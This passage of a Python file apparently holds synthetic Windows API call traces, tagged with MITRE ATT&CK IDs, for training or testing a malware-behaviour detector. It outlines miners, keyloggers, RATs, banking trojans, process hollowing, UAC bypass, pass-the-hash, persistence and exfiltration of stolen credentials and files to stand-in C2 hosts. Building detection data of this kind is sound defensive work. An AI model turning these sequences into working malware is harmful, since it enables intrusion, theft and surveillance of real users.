            ("connect", "sockaddr=target4:445"),
            ("send", "buf=smb_negotiate,len=256"),
            ("recv", "buf=response,len=4096"),
            ("send", "buf=exploit_payload,len=65536"),
            ("recv", "buf=shell,len=4096"),
        ],
    ],

    # ── 8  Miner — MITRE T1496 ──────────────────────────────────────
    BehaviorCategory.Miner: [
        # Classic CPU miner
        [
            ("CreateThread", "lpStartAddress=mine_worker,dwCreationFlags=0"),
            ("CreateThread", "lpStartAddress=mine_worker,dwCreationFlags=0"),
            ("CreateThread", "lpStartAddress=mine_worker,dwCreationFlags=0"),
            ("CreateThread", "lpStartAddress=mine_worker,dwCreationFlags=0"),
            ("SetThreadPriority", "hThread=worker,nPriority=THREAD_PRIORITY_LOWEST"),
            ("SetThreadAffinityMask", "hThread=worker,dwThreadAffinityMask=0xFF"),
            ("connect", "sockaddr=pool.mining.com:3333"),
            ("send", "buf=stratum_subscribe,len=256"),
            ("recv", "buf=job,len=1024"),
            ("send", "buf=share_result,len=128"),
        ],
        # GPU miner (OpenCL/CUDA setup)
        [
            ("LoadLibraryW", "lpLibFileName=nvcuda.dll"),
            ("GetProcAddress", "hModule=nvcuda,lpProcName=cuInit"),
            ("GetProcAddress", "hModule=nvcuda,lpProcName=cuDeviceGet"),
            ("GetProcAddress", "hModule=nvcuda,lpProcName=cuCtxCreate"),
            ("GetProcAddress", "hModule=nvcuda,lpProcName=cuMemAlloc"),
            ("connect", "sockaddr=pool.stratum:3333"),
            ("send", "buf=mining_subscribe,len=256"),
            ("recv", "buf=mining_job,len=1024"),
        ],
        # XMRig-style hidden miner
        [
            ("CreateProcessW", "lpCommandLine=conhost.exe --cinit-find-x"),
            ("CreateThread", "lpStartAddress=rx_worker,dwCreationFlags=0"),
            ("CreateThread", "lpStartAddress=rx_worker,dwCreationFlags=0"),
            ("SetProcessAffinityMask", "hProcess=self,dwProcessAffinityMask=0xFF"),
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("connect", "sockaddr=xmr.pool:443"),
            ("send", "buf=login_json,len=512"),
            ("recv", "buf=job_json,len=1024"),
        ],
        # Process-hollowed miner
        [
            ("CreateProcessW", "lpCommandLine=notepad.exe,dwCreationFlags=CREATE_SUSPENDED"),
            ("VirtualAllocEx", "hProcess=notepad,dwSize=1048576,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=notepad,lpBaseAddress=alloc,nSize=1048576"),
            ("ResumeThread", "hThread=notepad_main"),
            ("connect", "sockaddr=pool.mining:3333"),
            ("send", "buf=stratum_login,len=256"),
        ],
        # Wasm-based in-browser miner (spawner)
        [
            ("CreateProcessW", "lpCommandLine=chrome.exe --headless --disable-gpu http://miner.js"),
            ("CreateThread", "lpStartAddress=monitor_thread,dwCreationFlags=0"),
            ("SetThreadPriority", "hThread=monitor,nPriority=THREAD_PRIORITY_BELOW_NORMAL"),
            ("Sleep", "dwMilliseconds=60000"),
            ("connect", "sockaddr=coinhive.proxy:8892"),
            ("send", "buf=auth_token,len=128"),
        ],
    ],

    # ── 9  Adware — MITRE T1176 ─────────────────────────────────────
    BehaviorCategory.Adware: [
        # Browser redirect
        [
            ("ShellExecuteW", "lpFile=http://ads.malvertising.com/popup1"),
            ("InternetOpenW", "lpszAgent=AdBot/1.0"),
            ("InternetConnectW", "lpszServerName=tracking.adserver.com,nServerPort=80"),
            ("HttpOpenRequestW", "lpszVerb=GET,lpszObjectName=/track?id=12345"),
            ("HttpSendRequestW", "lpszHeaders=Cookie:session=abc"),
            ("InternetReadFile", "hFile=response,lpdwNumberOfBytesRead=8192"),
        ],
        # Browser extension injection
        [
            ("RegCreateKeyExW", "hKey=HKCU,lpSubKey=Software\\Google\\Chrome\\Extensions\\evil_ext"),
            ("RegSetValueExW", "lpValueName=path,lpData=C:\\ext\\manifest.json"),
            ("CopyFileW", "lpExistingFileName=ext.crx,lpNewFileName=C:\\ext\\ext.crx"),
            ("ShellExecuteW", "lpFile=chrome.exe --load-extension=C:\\ext"),
        ],
        # Desktop shortcut modification
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_ShellLink"),
            ("CreateFileW", "lpFileName=Desktop\\Chrome.lnk,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=2048"),
            ("ShellExecuteW", "lpFile=http://search.adware.com"),
        ],
        # Popup spam
        [
            ("CreateWindowExW", "lpClassName=AdPopup,lpWindowName=Special Offer!"),
            ("ShowWindow", "hWnd=popup,nCmdShow=SW_SHOW"),
            ("InternetOpenW", "lpszAgent=PopupEngine"),
            ("InternetOpenUrlW", "lpszUrl=http://ad-cdn.com/banner728.gif"),
            ("InternetReadFile", "hFile=response,lpdwNumberOfBytesRead=32768"),
        ],
        # Homepage hijack
        [
            ("RegOpenKeyExW", "hKey=HKCU,lpSubKey=Software\\Microsoft\\Internet Explorer\\Main"),
            ("RegSetValueExW", "lpValueName=Start Page,lpData=http://search.hijack.com"),
            ("RegOpenKeyExW", "hKey=HKCU,lpSubKey=Software\\Microsoft\\Internet Explorer\\SearchScopes"),
            ("RegSetValueExW", "lpValueName=URL,lpData=http://search.hijack.com?q={searchTerms}"),
            ("ShellExecuteW", "lpFile=iexplore.exe"),
        ],
    ],

    # ── 10  Keylogger — MITRE T1056.001 ─────────────────────────────
    BehaviorCategory.Keylogger: [
        # SetWindowsHookEx approach
        [
            ("SetWindowsHookExW", "idHook=WH_KEYBOARD_LL,lpfn=hook_proc"),
            ("GetMessageW", "lpMsg=out,hWnd=NULL"),
            ("TranslateMessage", "lpMsg=msg"),
            ("GetAsyncKeyState", "vKey=scan_all"),
            ("CreateFileW", "lpFileName=C:\\Users\\log.dat,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=512"),
        ],
        # Raw input device
        [
            ("RegisterRawInputDevices", "pRawInputDevices=keyboard,uiNumDevices=1"),
            ("GetRawInputData", "hRawInput=handle,pData=out"),
            ("GetForegroundWindow", ""),
            ("GetWindowTextW", "hWnd=foreground,lpString=out"),
            ("CreateFileW", "lpFileName=C:\\ProgramData\\input.log,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=256"),
        ],
        # DirectInput hook
        [
            ("LoadLibraryW", "lpLibFileName=dinput8.dll"),
            ("GetProcAddress", "hModule=dinput8,lpProcName=DirectInput8Create"),
            ("CoCreateInstance", "rclsid=CLSID_DirectInput8"),
            ("GetAsyncKeyState", "vKey=scan_all"),
            ("CreateFileW", "lpFileName=C:\\Temp\\keys.bin,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=1024"),
        ],
        # Screenshot + keylog
        [
            ("SetWindowsHookExW", "idHook=WH_KEYBOARD_LL,lpfn=hook_proc"),
            ("GetAsyncKeyState", "vKey=scan_all"),
            ("GetDC", "hWnd=NULL"),
            ("BitBlt", "hdcDest=memDC,hdcSrc=screenDC"),
            ("CreateFileW", "lpFileName=C:\\Temp\\screen.bmp,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=2097152"),
            ("CreateFileW", "lpFileName=C:\\Temp\\keys.log,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=512"),
        ],
        # Network exfil keylogger
        [
            ("SetWindowsHookExW", "idHook=WH_KEYBOARD_LL,lpfn=hook_proc"),
            ("GetAsyncKeyState", "vKey=scan_all"),
            ("GetForegroundWindow", ""),
            ("GetWindowTextW", "hWnd=foreground,lpString=out"),
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=keystrokes,len=2048"),
        ],
    ],

    # ── 11  RAT (Remote Access Trojan) ──────────────────────────────
    BehaviorCategory.RAT: [
        # Classic cmd dispatch
        [
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("socket", "af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP"),
            ("connect", "sockaddr=C2:8080"),
            ("recv", "buf=command,len=4096"),
            ("CreateProcessW", "lpCommandLine=cmd.exe /c <cmd>"),
            ("ReadFile", "hFile=stdout_pipe,nNumberOfBytesToRead=8192"),
            ("send", "buf=output,len=8192"),
        ],
        # File manager
        [
            ("recv", "buf=cmd_upload,len=4096"),
            ("CreateFileW", "lpFileName=uploaded.exe,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
            ("recv", "buf=cmd_download,len=4096"),
            ("CreateFileW", "lpFileName=target.doc,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("send", "buf=file_data,len=65536"),
        ],
        # Screen + webcam
        [
            ("recv", "buf=cmd_screenshot,len=256"),
            ("GetDC", "hWnd=NULL"),
            ("BitBlt", "hdcDest=memDC,hdcSrc=screenDC"),
            ("send", "buf=screenshot_bmp,len=2097152"),
            ("recv", "buf=cmd_webcam,len=256"),
            ("CoCreateInstance", "rclsid=CLSID_CaptureGraphBuilder2"),
            ("send", "buf=webcam_frame,len=921600"),
        ],
        # Reverse SOCKS proxy
        [
            ("WSAStartup", "wVersionRequested=0x0202"),
            ("connect", "sockaddr=C2:1080"),
            ("recv", "buf=socks_connect,len=256"),
            ("socket", "af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP"),
            ("connect", "sockaddr=internal_target:3389"),
            ("recv", "buf=relay_data,len=65536"),
            ("send", "buf=relay_data,len=65536"),
        ],
        # Persistence + keylog module
        [
            ("recv", "buf=cmd_persist,len=256"),
            ("RegCreateKeyExW", "hKey=HKCU,lpSubKey=Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            ("RegSetValueExW", "lpValueName=Update,lpData=C:\\rat.exe"),
            ("recv", "buf=cmd_keylog,len=256"),
            ("SetWindowsHookExW", "idHook=WH_KEYBOARD_LL,lpfn=hook_proc"),
            ("GetAsyncKeyState", "vKey=scan_all"),
            ("send", "buf=keylog_data,len=4096"),
        ],
    ],

    # ── 12  BankTrojan — MITRE T1185, T1557 ─────────────────────────
    BehaviorCategory.BankTrojan: [
        # Browser hooking (man-in-the-browser)
        [
            ("SetWindowsHookExW", "idHook=WH_CBT,lpfn=cbt_hook"),
            ("GetModuleHandleW", "lpModuleName=chrome.dll"),
            ("WriteProcessMemory", "hProcess=chrome,lpBaseAddress=hook_addr,nSize=64"),
            ("InternetConnectW", "lpszServerName=bank.com,nServerPort=443"),
            ("HttpSendRequestW", "lpszHeaders=Cookie:session=hijacked"),
            ("InternetReadFile", "hFile=response,lpdwNumberOfBytesRead=16384"),
        ],
        # Form grabber
        [
            ("SetWindowsHookExW", "idHook=WH_GETMESSAGE,lpfn=msg_hook"),
            ("GetWindowTextW", "hWnd=edit_control,lpString=username"),
            ("GetWindowTextW", "hWnd=edit_control,lpString=password"),
            ("connect", "sockaddr=drop_server:443"),
            ("send", "buf=credentials_json,len=1024"),
        ],
        # Web inject
        [
            ("InternetOpenW", "lpszAgent=BankAgent"),
            ("InternetConnectW", "lpszServerName=onlinebanking.com,nServerPort=443"),
            ("HttpOpenRequestW", "lpszVerb=GET,lpszObjectName=/transfer"),
            ("HttpSendRequestW", "lpszHeaders=injection"),
            ("InternetReadFile", "hFile=response,lpdwNumberOfBytesRead=32768"),
            ("WriteProcessMemory", "hProcess=browser,lpBaseAddress=dom_inject,nSize=4096"),
        ],
        # VNC hidden desktop
        [
            ("CreateDesktopW", "lpszDesktop=hidden_vnc"),
            ("CreateProcessW", "lpCommandLine=explorer.exe,lpDesktop=hidden_vnc"),
            ("socket", "af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP"),
            ("connect", "sockaddr=C2:5900"),
            ("send", "buf=vnc_framebuffer,len=1048576"),
            ("recv", "buf=vnc_input,len=256"),
        ],
        # SMS/OTP relay (via ADB bridge)
        [
            ("CreateProcessW", "lpCommandLine=adb.exe forward tcp:38000 tcp:38000"),
            ("connect", "sockaddr=localhost:38000"),
            ("recv", "buf=sms_otp,len=256"),
            ("InternetConnectW", "lpszServerName=bank.com,nServerPort=443"),
            ("HttpSendRequestW", "lpszHeaders=Content-Type:application/json,body=otp_value"),
        ],
    ],

    # ── 13  Spyware — MITRE T1113, T1125, T1123 ────────────────────
    BehaviorCategory.Spyware: [
        # Screenshot loop
        [
            ("GetDC", "hWnd=NULL"),
            ("CreateCompatibleDC", "hdc=screen"),
            ("BitBlt", "hdcDest=memDC,hdcSrc=screenDC"),
            ("CreateFileW", "lpFileName=C:\\Temp\\scr.bmp,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=2097152"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=screenshot,len=2097152"),
            ("Sleep", "dwMilliseconds=30000"),
        ],
        # Clipboard monitoring
        [
            ("OpenClipboard", "hWndNewOwner=NULL"),
            ("GetClipboardData", "uFormat=CF_TEXT"),
            ("GetClipboardData", "uFormat=CF_UNICODETEXT"),
            ("CloseClipboard", ""),
            ("RegQueryValueExW", "hKey=HKCU,lpSubKey=Software\\Credentials"),
            ("connect", "sockaddr=C2:8443"),
            ("send", "buf=clipboard_data,len=4096"),
        ],
        # Microphone capture
        [
            ("waveInOpen", "phwi=out,uDeviceID=WAVE_MAPPER"),
            ("waveInPrepareHeader", "hwi=handle,pwh=header"),
            ("waveInStart", "hwi=handle"),
            ("waveInUnprepareHeader", "hwi=handle,pwh=header"),
            ("CreateFileW", "lpFileName=C:\\Temp\\audio.wav,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=1048576"),
            ("send", "buf=audio_data,len=1048576"),
        ],
        # Webcam capture
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_CaptureGraphBuilder2"),
            ("CoCreateInstance", "rclsid=CLSID_SampleGrabber"),
            ("CreateFileW", "lpFileName=C:\\Temp\\cam.jpg,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=524288"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=camera_frame,len=524288"),
        ],
        # Location + system info
        [
            ("GetComputerNameW", "lpBuffer=out"),
            ("GetUserNameW", "lpBuffer=out"),
            ("RegOpenKeyExW", "hKey=HKLM,lpSubKey=SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
            ("RegQueryValueExW", "lpValueName=ProductName"),
            ("GetSystemInfo", "lpSystemInfo=out"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=sysinfo_json,len=2048"),
            ("Sleep", "dwMilliseconds=60000"),
        ],
    ],

    # ── 14  Fileless — MITRE T1059.001, T1055.012 ──────────────────
    BehaviorCategory.Fileless: [
        # PowerShell reflective load
        [
            ("CreateProcessW", "lpCommandLine=powershell.exe -nop -w hidden -enc <base64>"),
            ("VirtualAlloc", "dwSize=65536,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=self,lpBaseAddress=alloc,nSize=65536"),
            ("VirtualProtect", "lpAddress=alloc,dwSize=65536,flNewProtect=PAGE_EXECUTE_READ"),
            ("CreateThread", "lpStartAddress=alloc"),
        ],
        # .NET in-memory assembly
        [
            ("LoadLibraryW", "lpLibFileName=clr.dll"),
            ("GetProcAddress", "hModule=clr,lpProcName=CLRCreateInstance"),
            ("VirtualAlloc", "dwSize=1048576,flProtect=PAGE_READWRITE"),
            ("VirtualProtect", "lpAddress=alloc,dwSize=1048576,flNewProtect=PAGE_EXECUTE_READ"),
            ("CreateThread", "lpStartAddress=clr_entry"),
        ],
        # WMI persistent fileless
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_WbemLocator"),
            ("IWbemLocator_ConnectServer", "strNetworkResource=root\\subscription"),
            ("IWbemServices_ExecMethod", "strMethodName=PutInstance,EventFilter"),
            ("IWbemServices_ExecMethod", "strMethodName=PutInstance,CommandLineEventConsumer"),
            ("IWbemServices_ExecMethod", "strMethodName=PutInstance,FilterToConsumerBinding"),
        ],
        # VBA macro → shellcode
        [
            ("VirtualAlloc", "dwSize=4096,flProtect=PAGE_EXECUTE_READWRITE"),
            ("RtlMoveMemory", "Destination=alloc,Source=shellcode,Length=4096"),
            ("VirtualProtect", "lpAddress=alloc,dwSize=4096,flNewProtect=PAGE_EXECUTE_READ"),
            ("CreateThread", "lpStartAddress=alloc"),
            ("WaitForSingleObject", "hHandle=thread,dwMilliseconds=INFINITE"),
        ],
        # Process hollowing (fileless variant)
        [
            ("CreateProcessW", "lpCommandLine=svchost.exe,dwCreationFlags=CREATE_SUSPENDED"),
            ("NtUnmapViewOfSection", "ProcessHandle=suspended,BaseAddress=imageBase"),
            ("VirtualAllocEx", "hProcess=suspended,dwSize=1048576,flProtect=PAGE_EXECUTE_READWRITE"),
            ("WriteProcessMemory", "hProcess=suspended,lpBaseAddress=newBase,nSize=1048576"),
            ("SetThreadContext", "hThread=main,lpContext=modified_entry"),
            ("ResumeThread", "hThread=main"),
        ],
        # Registry-resident payload
        [
            ("RegCreateKeyExW", "hKey=HKCU,lpSubKey=Software\\Classes\\payload"),
            ("RegSetValueExW", "lpValueName=data,dwType=REG_BINARY,cbData=65536"),
            ("RegQueryValueExW", "lpValueName=data,lpData=out,lpcbData=65536"),
            ("VirtualAlloc", "dwSize=65536,flProtect=PAGE_EXECUTE_READWRITE"),
            ("RtlMoveMemory", "Destination=alloc,Source=reg_data,Length=65536"),
            ("CreateThread", "lpStartAddress=alloc"),
        ],
    ],

    # ── 15  LateralMovement — MITRE T1021, T1570 ───────────────────
    BehaviorCategory.LateralMovement: [
        # WMI remote exec
        [
            ("WNetEnumResourceW", "lpNetResource=root"),
            ("NetUserEnum", "servername=\\\\target,level=1"),
            ("CoCreateInstance", "rclsid=CLSID_WbemLocator"),
            ("IWbemLocator_ConnectServer", "strNetworkResource=\\\\target\\root\\cimv2"),
            ("IWbemServices_ExecMethod", "strMethodName=Create,CommandLine=payload.exe"),
        ],
        # Service-based (T1021.002)
        [
            ("WNetAddConnection2W", "lpRemoteName=\\\\target\\ADMIN$,lpPassword=hash"),
            ("CopyFileW", "lpExistingFileName=payload.exe,lpNewFileName=\\\\target\\ADMIN$\\payload.exe"),
            ("OpenSCManagerW", "lpMachineName=\\\\target"),
            ("CreateServiceW", "lpServiceName=SvcUpdate,lpBinaryPathName=payload.exe"),
            ("StartServiceW", "hService=SvcUpdate"),
        ],
        # RDP hijack
        [
            ("WTSEnumerateSessionsW", "hServer=target"),
            ("WTSConnectSessionW", "LogonId=target_session,TargetLogonId=current"),
            ("CreateProcessW", "lpCommandLine=cmd.exe"),
        ],
        # DCOM lateral
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_ShellBrowserWindow"),
            ("CLSIDFromProgID", "lpszProgID=MMC20.Application"),
            ("IWbemServices_ExecMethod", "strMethodName=ExecuteShellCommand,cmd=payload.exe"),
        ],
        # Pass-the-hash
        [
            ("LogonUserW", "lpszUsername=admin,dwLogonType=LOGON32_LOGON_NEW_CREDENTIALS"),
            ("ImpersonateLoggedOnUser", "hToken=token"),
            ("WNetAddConnection2W", "lpRemoteName=\\\\target\\C$"),
            ("CopyFileW", "lpExistingFileName=agent.exe,lpNewFileName=\\\\target\\C$\\agent.exe"),
            ("CreateServiceW", "lpServiceName=Agent,lpBinaryPathName=agent.exe"),
            ("StartServiceW", "hService=Agent"),
        ],
    ],

    # ── 16  Exfiltration — MITRE T1041, T1048 ──────────────────────
    BehaviorCategory.Exfiltration: [
        # Bulk file read + TCP exfil
        [
            ("FindFirstFileW", "lpFileName=C:\\Users\\Documents\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=document.docx,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=1048576"),
            ("connect", "sockaddr=exfil:443"),
            ("send", "buf=file_data,len=1048576"),
        ],
        # Archive + exfil
        [
            ("FindFirstFileW", "lpFileName=C:\\Confidential\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=C:\\Temp\\archive.zip,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=4194304"),
            ("InternetOpenW", "lpszAgent=Uploader"),
            ("InternetConnectW", "lpszServerName=cloud.drop.io,nServerPort=443"),
            ("HttpSendRequestW", "lpszHeaders=Content-Type:multipart/form-data"),
        ],
        # DNS exfiltration
        [
            ("FindFirstFileW", "lpFileName=C:\\Secrets\\*.*"),
            ("CreateFileW", "lpFileName=secrets.db,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("DnsQuery_W", "pszName=<encoded_chunk>.exfil.dns.com,wType=DNS_TYPE_TXT"),
            ("DnsQuery_W", "pszName=<encoded_chunk2>.exfil.dns.com,wType=DNS_TYPE_TXT"),
        ],
        # ICMP tunnel exfil
        [
            ("FindFirstFileW", "lpFileName=C:\\Financial\\*.*"),
            ("CreateFileW", "lpFileName=report.pdf,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=262144"),
            ("socket", "af=AF_INET,type=SOCK_RAW,protocol=IPPROTO_ICMP"),
            ("sendto", "buf=encoded_data,len=1024,to=C2"),
        ],
        # Staged exfil (break into chunks)
        [
            ("FindFirstFileW", "lpFileName=C:\\Data\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=database.sql,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=4096"),
            ("CryptEncrypt", "hKey=key,hHash=0,Final=FALSE,dwBufLen=4096"),
            ("connect", "sockaddr=C2:443"),
            ("send", "buf=encrypted_chunk,len=4096"),
            ("Sleep", "dwMilliseconds=5000"),
        ],
        # Cloud storage exfil
        [
            ("FindFirstFileW", "lpFileName=C:\\Projects\\*.*"),
            ("FindNextFileW", "hFindFile=handle"),
            ("CreateFileW", "lpFileName=source.tar.gz,dwDesiredAccess=GENERIC_READ"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=2097152"),
            ("WinHttpOpen", "pszAgentW=CloudSync"),
            ("WinHttpConnect", "pswzServerName=api.mega.nz,nServerPort=443"),
            ("WinHttpOpenRequest", "pwszVerb=PUT,pwszObjectName=/upload"),
            ("WinHttpSendRequest", "dwTotalLength=2097152"),
        ],
    ],

    # ── 17  Persistence — MITRE T1547, T1053 ────────────────────────
    BehaviorCategory.Persistence: [
        # Registry Run key
        [
            ("RegCreateKeyExW", "hKey=HKCU,lpSubKey=Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            ("RegSetValueExW", "lpValueName=WindowsUpdate,lpData=C:\\evil.exe"),
            ("CopyFileW", "lpExistingFileName=evil.exe,lpNewFileName=C:\\ProgramData\\evil.exe"),
        ],
        # Scheduled task
        [
            ("CreateProcessW", "lpCommandLine=schtasks /create /tn Updater /tr C:\\payload.exe /sc onlogon /ru SYSTEM"),
            ("WaitForSingleObject", "hHandle=process,dwMilliseconds=10000"),
            ("CopyFileW", "lpExistingFileName=payload.exe,lpNewFileName=C:\\payload.exe"),
        ],
        # Service creation
        [
            ("OpenSCManagerW", "dwDesiredAccess=SC_MANAGER_ALL_ACCESS"),
            ("CreateServiceW", "lpServiceName=WinDefend2,dwServiceType=SERVICE_WIN32_OWN_PROCESS,dwStartType=SERVICE_AUTO_START,lpBinaryPathName=C:\\svc.exe"),
            ("StartServiceW", "hService=WinDefend2"),
            ("CopyFileW", "lpExistingFileName=svc.exe,lpNewFileName=C:\\svc.exe"),
        ],
        # DLL search-order hijack
        [
            ("GetSystemDirectoryW", "lpBuffer=out"),
            ("CreateFileW", "lpFileName=C:\\Program Files\\App\\version.dll,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
            ("SetFileAttributesW", "lpFileName=C:\\Program Files\\App\\version.dll,dwFileAttributes=FILE_ATTRIBUTE_HIDDEN"),
        ],
        # COM hijack
        [
            ("RegCreateKeyExW", "hKey=HKCU,lpSubKey=Software\\Classes\\CLSID\\{GUID}\\InprocServer32"),
            ("RegSetValueExW", "lpValueName=,lpData=C:\\evil.dll"),
            ("RegSetValueExW", "lpValueName=ThreadingModel,lpData=Both"),
        ],
        # Startup folder
        [
            ("GetSpecialFolderPathW", "nFolder=CSIDL_STARTUP,lpszPath=out"),
            ("CopyFileW", "lpExistingFileName=trojan.exe,lpNewFileName=C:\\Users\\Startup\\trojan.exe"),
            ("SetFileAttributesW", "lpFileName=C:\\Users\\Startup\\trojan.exe,dwFileAttributes=FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM"),
        ],
        # WMI event subscription
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_WbemLocator"),
            ("IWbemLocator_ConnectServer", "strNetworkResource=root\\subscription"),
            ("IWbemServices_ExecMethod", "strMethodName=PutInstance,class=__EventFilter"),
            ("IWbemServices_ExecMethod", "strMethodName=PutInstance,class=CommandLineEventConsumer"),
            ("IWbemServices_ExecMethod", "strMethodName=PutInstance,class=__FilterToConsumerBinding"),
        ],
    ],

    # ── 18  PrivEsc — MITRE T1134, T1068 ────────────────────────────
    BehaviorCategory.PrivEsc: [
        # Token manipulation
        [
            ("OpenProcessToken", "ProcessHandle=current,DesiredAccess=TOKEN_ALL_ACCESS"),
            ("LookupPrivilegeValueW", "lpName=SeDebugPrivilege"),
            ("AdjustTokenPrivileges", "TokenHandle=token,Privileges=SeDebugPrivilege:SE_PRIVILEGE_ENABLED"),
            ("ImpersonateLoggedOnUser", "hToken=system_token"),
        ],
        # Named pipe impersonation
        [
            ("CreateNamedPipeW", "lpName=\\\\.\\pipe\\spoolss_exploit"),
            ("ConnectNamedPipe", "hNamedPipe=pipe"),
            ("ImpersonateNamedPipeClient", "hNamedPipe=pipe"),
            ("OpenThreadToken", "ThreadHandle=current,DesiredAccess=TOKEN_ALL_ACCESS"),
            ("DuplicateTokenEx", "hExistingToken=impersonated,dwDesiredAccess=TOKEN_ALL_ACCESS"),
            ("CreateProcessAsUserW", "hToken=system_token,lpCommandLine=cmd.exe"),
        ],
        # UAC bypass (fodhelper)
        [
            ("RegCreateKeyExW", "hKey=HKCU,lpSubKey=Software\\Classes\\ms-settings\\Shell\\Open\\command"),
            ("RegSetValueExW", "lpValueName=,lpData=C:\\payload.exe"),
            ("RegSetValueExW", "lpValueName=DelegateExecute,lpData="),
            ("ShellExecuteW", "lpFile=fodhelper.exe"),
        ],
        # Kernel exploit setup
        [
            ("NtQuerySystemInformation", "SystemInformationClass=SystemModuleInformation"),
            ("LoadLibraryW", "lpLibFileName=ntoskrnl.exe"),
            ("GetProcAddress", "hModule=ntoskrnl,lpProcName=ExAllocatePoolWithTag"),
            ("DeviceIoControl", "dwIoControlCode=IOCTL_VULN_TRIGGER"),
            ("OpenProcessToken", "ProcessHandle=current,DesiredAccess=TOKEN_ALL_ACCESS"),
            ("CreateProcessW", "lpCommandLine=cmd.exe,bInheritHandles=TRUE"),
        ],
        # Service abuse (weak permissions)
        [
            ("OpenSCManagerW", "dwDesiredAccess=SC_MANAGER_ALL_ACCESS"),
            ("OpenServiceW", "lpServiceName=VulnService,dwDesiredAccess=SERVICE_ALL_ACCESS"),
            ("ChangeServiceConfigW", "hService=vuln,lpBinaryPathName=C:\\payload.exe"),
            ("StartServiceW", "hService=vuln"),
        ],
        # BITS job abuse
        [
            ("CoInitializeEx", "dwCoInit=COINIT_MULTITHREADED"),
            ("CoCreateInstance", "rclsid=CLSID_BackgroundCopyManager"),
            ("OpenProcessToken", "ProcessHandle=current,DesiredAccess=TOKEN_QUERY"),
            ("AdjustTokenPrivileges", "TokenHandle=token,Privileges=SeImpersonatePrivilege:SE_PRIVILEGE_ENABLED"),
            ("CreateProcessW", "lpCommandLine=cmd.exe /c whoami"),
        ],
    ],

    # ── 19  Benign ──────────────────────────────────────────────────
    BehaviorCategory.Benign: [
        # Standard GUI application
        [
            ("GetModuleHandleW", "lpModuleName=NULL"),
            ("RegisterClassExW", "lpwcx=WNDCLASSEX"),
            ("CreateWindowExW", "lpClassName=MainWindow,lpWindowName=Application"),
            ("ShowWindow", "hWnd=main,nCmdShow=SW_SHOW"),
            ("UpdateWindow", "hWnd=main"),
            ("GetMessageW", "lpMsg=out,hWnd=NULL"),
            ("TranslateMessage", "lpMsg=msg"),
            ("DispatchMessageW", "lpMsg=msg"),
        ],
        # File read/write (office app)
        [
            ("CreateFileW", "lpFileName=document.docx,dwDesiredAccess=GENERIC_READ"),
            ("GetFileSize", "hFile=handle"),
            ("ReadFile", "hFile=handle,nNumberOfBytesToRead=65536"),
            ("CloseHandle", "hObject=handle"),
            ("CreateFileW", "lpFileName=document.docx,dwDesiredAccess=GENERIC_WRITE"),
            ("WriteFile", "hFile=handle,nNumberOfBytesToWrite=65536"),
            ("FlushFileBuffers", "hFile=handle"),
            ("CloseHandle", "hObject=handle"),
        ],
        # HTTP client (browser/updater)
        [
            ("InternetOpenW", "lpszAgent=Browser/1.0"),
            ("InternetConnectW", "lpszServerName=www.example.com,nServerPort=443"),
            ("HttpOpenRequestW", "lpszVerb=GET,lpszObjectName=/index.html"),
